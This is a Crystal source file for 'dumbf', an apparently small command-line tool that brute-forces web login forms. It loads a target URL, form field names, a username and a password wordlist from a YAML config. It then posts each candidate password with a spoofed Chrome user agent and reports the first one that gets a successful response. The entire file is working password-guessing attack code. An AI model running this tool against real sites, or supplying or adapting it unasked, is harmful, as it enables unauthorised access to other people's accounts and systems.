require "./dumbf/*"
require "halite"
require "yaml"
require "option_parser"

module Dumbf
  class Starter
    @buff_fork : Int32 = 0

    def initialize
      available = ["http_form"]
      config, atype, fork = "./config.yml", "http_form", 0

      OptionParser.parse! do |parser|
        parser.banner = "Usage: dumbf [arguments]"
        parser.on("-config FILE", "--config=FILE", "Specifies path to config.yml file") { |v| config = v }
        parser.on("-type ATTACK", "--type=ATTACK", "Specifies attack type") { |v| atype = v }
        parser.on("-fork TOTAL", "--fork=TOTAL", "Total of Process Forking") { |v| fork = v }
        parser.on("-h", "--help", "Show this help") { puts parser }
      end

      return raise("Unsupported Attack Type") if !available.includes?(atype)

      data = YAML.parse(File.read(config))
      if atype == "http_form"
        http_form(data, fork)
      end
    end

    def http_form(data, fork)
      fork = fork.to_i
      word_list = File.read_lines(data["list"].to_s)

      client = Halite::Client.new do |options|
        options.headers = {
          user_agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
        }

        # Enable logging
        options.logging = false

        # Set read timeout to one minute
        options.read_timeout = 1.minutes
      end

      url = data["url"].to_s
      client.get(url)

      username_name = data["form"]["username"].to_s
      password_name = data["form"]["password"].to_s

      username_value = data["value"]["username"].to_s
      puts "starting"
      word_list.each do |v|
        v = v.to_s
        post = client.post(url, form: {username_name => username_value, password_name => v})
        if post.success?
          puts "Password Found : #{v}"
          exit 0
        end
        @buff_fork -= 1
      end
    end
  end
end

Dumbf::Starter.new
